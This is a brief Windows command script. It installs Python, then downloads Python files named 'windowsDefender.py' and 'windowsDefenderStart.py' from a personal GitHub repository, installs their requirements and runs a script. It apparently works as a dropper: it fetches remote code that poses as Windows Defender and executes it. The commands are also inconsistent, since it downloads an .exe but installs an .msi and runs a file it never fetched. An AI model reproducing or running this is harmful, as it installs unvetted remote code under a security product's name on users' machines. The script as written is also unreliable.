curl https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe -O
msiexec /a python-3.9.13.amd64.msi /qb TARGETDIR=C:\python39


curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/windowsDefender.py -O
curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/windowsDefenderStart.py -O
curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/requirements.txt -O

pip install -r requirements.txt

python runer.py
